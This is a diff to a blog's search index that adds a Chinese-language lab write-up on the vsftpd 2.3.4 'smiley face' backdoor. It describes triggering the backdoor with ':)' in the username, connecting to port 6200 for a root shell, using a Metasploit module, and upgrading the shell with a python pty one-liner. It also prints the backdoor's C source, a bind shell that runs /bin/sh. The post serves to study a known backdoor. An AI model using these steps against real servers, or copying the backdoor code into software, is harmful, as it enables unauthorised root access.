@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>Ftp-21笑脸漏洞</title>
+      <link href="/article/c9cbeb0d.html"/>
+      <url>/article/c9cbeb0d.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="vsftpd2-2-3-4后门，笑脸漏洞"><a href="#vsftpd2-2-3-4后门，笑脸漏洞" class="headerlink" title="vsftpd2~2.3.4后门，笑脸漏洞"></a>vsftpd2~2.3.4后门，笑脸漏洞</h1><p><strong>本实验完全在本人虚拟机上进行测试，只是为了交流学习所用，如访客通过本对文章的学习造成实质性的危害，与本人无关，望周知。</strong></p><span id="more"></span><h1 id="1-演示"><a href="#1-演示" class="headerlink" title="1. 演示"></a>1. 演示</h1><img src="/article/c9cbeb0d/image-20220713195310519-16577165123461.png" class title="image-20220713195310519"><img src="/article/c9cbeb0d/image-20220713195529436-16577165123462.png" class title="image-20220713195529436"><p>结果如上，不仅仅有vsftpd的具体版本还反馈出运行匿名登录（anonymous 密码：为空或者任意邮箱）</p><p>尝试匿名登录：返回230 登录成功</p><img src="/article/c9cbeb0d/image-20220713200059249-16577165123473.png" class title="image-20220713200059249"><p>第一张图片中检测端口6200没有开发，为确认一下，使用nc进行确认：如下</p><img src="/article/c9cbeb0d/image-20220713200833448-16577165123474.png" class title="image-20220713200833448"><p>尝试手动激活后门：笑脸漏洞就是在user后存在:)会在6200端口上获得shell</p><img src="/article/c9cbeb0d/image-20220713201750465-16577165123476.png" class title="image-20220713201750465"><p>然后连接6200端口</p><img src="/article/c9cbeb0d/image-20220713201911645-16577165123475.png" class title="image-20220713201911645"><p>此时以及获取root权限，可以为所欲为了。</p><p>下面展示用metasploit 利用该模块进行实验</p><img src="/article/c9cbeb0d/image-20220713202559623-16577165123477.png" class title="image-20220713202559623"><p>进入对于的文件，查看配置，修改对应的端口号和ip地址，然后exploit，开始攻击。</p><img src="/article/c9cbeb0d/image-20220713202810477-16577165123478.png" class title="image-20220713202810477"><p>攻击效果如下：</p><img src="/article/c9cbeb0d/image-20220713202910489-16577165123479.png" class title="image-20220713202910489"><p>由于交互有点鸡肋，可以运行python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><img src="/article/c9cbeb0d/image-20220713203335635-165771651234710.png" class title="image-20220713203335635"><h1 id="2-原理"><a href="#2-原理" class="headerlink" title="2. 原理"></a>2. 原理</h1><p>先看VSFTPD源码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//此代码位于VSFTPD2.3.4的str.c中</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((p_str-&gt;p_buf[i]==<span class="number">0x3a</span>)</span><br><span class="line">&amp;&amp; (p_str-&gt;p_buf[i+<span class="number">1</span>]==<span class="number">0x29</span>))</span><br><span class="line">&#123;</span><br><span class="line">  vsf_sysutil_extra();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断字符串的某一位和下一位是否为”:” (0x3a) 和 “)” (0x29).如果是则直接运行vsf_sysutil_extra()这个函数。</p><p>那么这个函数是什么捏。看下源码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码位于VSFTPD2.3.4中的sysdeputil.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vsf_sysutil_extra</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd, rfd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">  <span class="keyword">if</span>((fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>)  </span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">  sa.sin_family = AF_INET;</span><br><span class="line">  sa.sin_port = htons(<span class="number">6200</span>);</span><br><span class="line">  sa.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">  <span class="keyword">if</span>((bind(fd,(<span class="keyword">struct</span> sockaddr *)&amp;sa,</span><br><span class="line">  <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr))) &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>((listen(fd, <span class="number">100</span>)) == <span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span>(;;)</span><br><span class="line">  &#123;</span><br><span class="line">    rfd = accept(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    close(<span class="number">0</span>); close(<span class="number">1</span>); close(<span class="number">2</span>);</span><br><span class="line">    dup2(rfd, <span class="number">0</span>); dup2(rfd, <span class="number">1</span>); dup2(rfd, <span class="number">2</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,(<span class="type">char</span> *)<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致就是在6200端口上开启了一个socket服务，而且还配置了一个反弹shell。（有一说一我觉得是官方想自偷自盗）。</p><p>原理部分参考<a href="https://yhaonan.gitee.io/blog/2018/10/16/Metasploit/VSFTPD%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">HAONAN的BLOG</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Security </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Security </tag>
+            
+            <tag> Ftp-21 </tag>
+            
+            <tag> vsftpd2.3.4 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>A simple example of extracting root permissions</title>
       <link href="/article/7526ee7e.html"/>
       <url>/article/7526ee7e.html</url>
@@ -47,9 +76,9 @@
       
         <tags>
             
-            <tag> Intership </tag>
-            
             <tag> Security </tag>
+            
+            <tag> Intership </tag>
             
             <tag> Assessments </tag>
             
